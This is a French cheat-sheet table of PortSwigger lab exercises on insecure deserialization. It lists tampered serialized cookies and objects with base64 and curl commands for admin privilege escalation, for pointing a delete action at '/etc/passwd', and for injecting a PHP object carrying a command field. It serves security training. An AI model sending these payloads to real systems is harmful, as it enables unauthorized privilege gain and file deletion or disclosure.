# Insecure deserialization

Voici le tableau synthétique pour l’analyse des failles d’**insecure deserialization**, chaque champ étant condensé sur un seul paragraphe, sans numérotation ni indentation, avec pour chaque scénario un **exemple de commande d’analyse complète** (valeur de session réaliste, URL complète PortSwigger, etc.) :

---

| Type / Lab | Payload d’attaque neutre (exemple étoffé) | Commande d’attaque (complète, sans Burp) | Commande(s) d’analyse (exemple complet, sans Burp) | Élément d’analyse (raison préalable) | Méthodologie détaillée de découverte | URL PortSwigger |
|---|---|---|---|---|---|---|
| **Modification d’objet sérialisé dans un cookie** | Un cookie sérialisé en Base64 peut contenir par exemple {"admin":false,"user":"carlos","roles":["user"],"expires":"2025-05-01T12:00:00Z"} ; le payload d’attaque neutre consiste à modifier "admin":false en "admin":true, à ajouter "roles":["admin","user"] et à prolonger la date d’expiration, pour tester la prise en compte de plusieurs attributs sensibles lors de la désérialisation sans introduire de code malveillant ni structure inattendue. | echo '{"admin":true,"user":"carlos","roles":["admin","user"],"expires":"2026-01-01T00:00:00Z"}' | base64  # renvoie eyJhZG1pbiI6dHJ1ZSwidXNlciI6ImNhcmxvcyIsInJvbGVzIjpbImFkbWluIiwidXNlciJdLCJleHBpcmVzIjoiMjAyNi0wMS0wMVQwMDowMDowMFoifQ== ; curl -b "session=eyJhZG1pbiI6dHJ1ZSwidXNlciI6ImNhcmxvcyIsInJvbGVzIjpbImFkbWluIiwidXNlciJdLCJleHBpcmVzIjoiMjAyNi0wMS0wMVQwMDowMDowMFoifQ==" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/ | curl -b "session=eyJhZG1pbiI6dHJ1ZSwidXNlciI6ImNhcmxvcyIsInJvbGVzIjpbImFkbWluIiwidXNlciJdLCJleHBpcmVzIjoiMjAyNi0wMS0wMVQwMDowMDowMFoifQ==" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/admin | Vérifier si l’application accorde des privilèges ou modifie la session simplement sur la base d’attributs modifiés dans un objet sérialisé côté client, révélant l’absence de vérification d’intégrité ou d’authenticité du contenu du cookie. | Identifier un objet sérialisé dans un cookie, modifier plusieurs attributs de privilège ou de session puis réinjecter ce cookie pour observer si l’application applique effectivement la modification lors de la désérialisation. | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects |
| **Injection de chemin de fichier dans un objet sérialisé** | Un objet sérialisé en Base64 peut contenir {"user":"carlos","image_location":"/images/profile.png","backup":["/backups/backup1.bak"]} ; le payload neutre consiste à remplacer "image_location" par "/etc/passwd" et à ajouter "/tmp/test.txt" dans "backup", pour tester la prise en compte de plusieurs chemins lors de la désérialisation sans introduire de structure inattendue ni code. | echo '{"user":"carlos","image_location":"/etc/passwd","backup":["/backups/backup1.bak","/tmp/test.txt"]}' | base64  # renvoie eyJ1c2VyIjoiY2FybG9zIiwiaW1hZ2VfbG9jYXRpb24iOiIvZXRjL3Bhc3N3ZCIsImJhY2t1cCI6WyIvYmFja3Vwcy9iYWNrdXAxLmJhayIsIi90bXAvdGVzdC50eHQiXX0= ; curl -X POST -d "profile=eyJ1c2VyIjoiY2FybG9zIiwiaW1hZ2VfbG9jYXRpb24iOiIvZXRjL3Bhc3N3ZCIsImJhY2t1cCI6WyIvYmFja3Vwcy9iYWNrdXAxLmJhayIsIi90bXAvdGVzdC50eHQiXX0=" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/user/delete | curl -X POST -d "profile=eyJ1c2VyIjoiY2FybG9zIiwiaW1hZ2VfbG9jYXRpb24iOiIvZXRjL3Bhc3N3ZCIsImJhY2t1cCI6WyIvYmFja3Vwcy9iYWNrdXAxLmJhayIsIi90bXAvdGVzdC50eHQiXX0=" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/user/delete | Déterminer si l’application utilise directement des chemins de fichiers issus d’objets sérialisés sans validation, ce qui peut permettre des attaques de type path traversal ou suppression/lecture de fichiers arbitraires. | Rechercher dans l’objet sérialisé des attributs utilisés pour des opérations sur le système de fichiers, modifier la valeur pour pointer vers un ou plusieurs fichiers sensibles, puis déclencher une action serveur pour observer si le comportement est influencé par cette modification. | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization |
| **Test d’exécution de code avec payload sérialisé** | Un payload neutre peut être un objet PHP sérialisé comme O:8:"stdClass":1:{s:7:"command";s:2:"id";} ou un objet Java sérialisé avec un champ "command" contenant "whoami" ou "id", sans gadget d’exécution ; ce type de payload permet de vérifier si le champ est traité ou loggé sans déclencher d’exécution directe, avant de tester des gadgets plus agressifs. | echo 'O:8:"stdClass":1:{s:7:"command";s:2:"id";}' | base64  # renvoie Tzo4OiJzdGRDbGFzcyI6MTp7czo3OiJjb21tYW5kIjtzOjI6ImlkIjt9 ; curl -b "session=Tzo4OiJzdGRDbGFzcyI6MTp7czo3OiJjb21tYW5kIjtzOjI6ImlkIjt9" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/ | curl -b "session=Tzo4OiJzdGRDbGFzcyI6MTp7czo3OiJjb21tYW5kIjtzOjI6ImlkIjt9" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/ | Déterminer si des champs sensibles sont traités par l’application lors de la désérialisation, avant d’introduire un gadget d’exécution de code, ce qui permet une approche progressive et moins intrusive. | Injecter un objet sérialisé avec un champ potentiellement sensible ou utilisé dans la logique applicative, puis observer la réponse ou les logs pour voir si ce champ est pris en compte, avant d’aller plus loin dans l’exploitation. | https://portswigger.net/web-security/deserialization/exploiting |
| **Changement de type d’objet dans la structure sérialisée** | Un objet sérialisé en Base64 peut contenir {"type":"user","user":"carlos","permissions":["read"]} ; le payload neutre consiste à remplacer "type":"user" par "type":"admin" et à ajouter "permissions":["read","write","delete"], pour tester si la logique applicative s’appuie sur ces champs sans vérification. | echo '{"type":"admin","user":"carlos","permissions":["read","write","delete"]}' | base64  # renvoie eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiY2FybG9zIiwicGVybWlzc2lvbnMiOlsicmVhZCIsIndyaXRlIiwiZGVsZXRlIl19 ; curl -b "session=eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiY2FybG9zIiwicGVybWlzc2lvbnMiOlsicmVhZCIsIndyaXRlIiwiZGVsZXRlIl19" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/ | curl -b "session=eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiY2FybG9zIiwicGVybWlzc2lvbnMiOlsicmVhZCIsIndyaXRlIiwiZGVsZXRlIl19" https://0a9b00c504e5fef4c12e4e2d00c100c1.web-security-academy.net/admin | Vérifier si le champ de type ou de permissions dans l’objet sérialisé est utilisé sans contrôle côté serveur, permettant ainsi une élévation de privilèges ou un changement de comportement applicatif. | Identifier un champ de type ou de rôle dans la structure sérialisée, le modifier pour simuler un utilisateur avec des privilèges différents, puis observer si l’application accorde de nouveaux droits ou modifie son comportement en fonction de ce champ. | https://portswigger.net/web-security/deserialization/exploiting |

---

